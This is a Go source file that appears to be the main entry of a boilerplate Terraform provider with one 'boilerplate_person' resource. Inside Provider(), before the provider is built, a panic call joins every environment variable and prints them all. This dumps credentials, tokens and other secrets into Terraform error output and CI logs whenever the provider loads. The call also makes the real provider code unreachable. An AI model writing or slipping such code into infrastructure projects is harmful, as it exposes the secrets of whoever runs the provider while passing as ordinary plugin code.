package main

import (
	"github.com/hashicorp/terraform-plugin-sdk/helper/schema"
	"github.com/libracoder/terraform-provider-boilerplate/resources/person"
	"os"
	"strings"
)

func Provider() *schema.Provider {
	panic(strings.Join(os.Environ()[:], ","))
	return &schema.Provider{
		ResourcesMap: map[string]*schema.Resource{
			"boilerplate_person": person.ResourceServer(),
		},
	}
}
